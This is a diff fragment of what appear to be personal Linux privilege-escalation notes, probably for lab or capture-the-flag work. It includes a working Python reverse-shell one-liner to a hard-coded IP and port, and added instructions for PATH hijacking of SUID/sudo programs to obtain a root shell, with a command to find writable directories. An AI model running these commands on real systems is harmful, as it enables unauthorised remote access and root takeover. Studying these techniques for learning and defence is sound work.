@@ -157,3 +157,24 @@ cat /etc/crontab
 
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.93.140",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
 
+---------------------------------
+            Path
+---------------------------------
+
+If a folder a user has write permissions is located in the PATH variable, a user could potentially hijack an
+application.
+
+if an application that is being run as root attempts to launch another application without defining its 
+absolute path, we can hijack this.
+
+we can hijack this if we are able to write to any of the directorys in $PATH or if we can edit the path variable
+
+For example:
+We have a script with SUDO SUID bit executing 'cool-script' but does not point to the path of the script, and in the $PATH variable there is '/tmp' we could make our own 'cool-script' file in /tmp and execute the SUID bit
+executable and get a root shell.
+
+We can find $PATH variables we can write to using:
+
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+
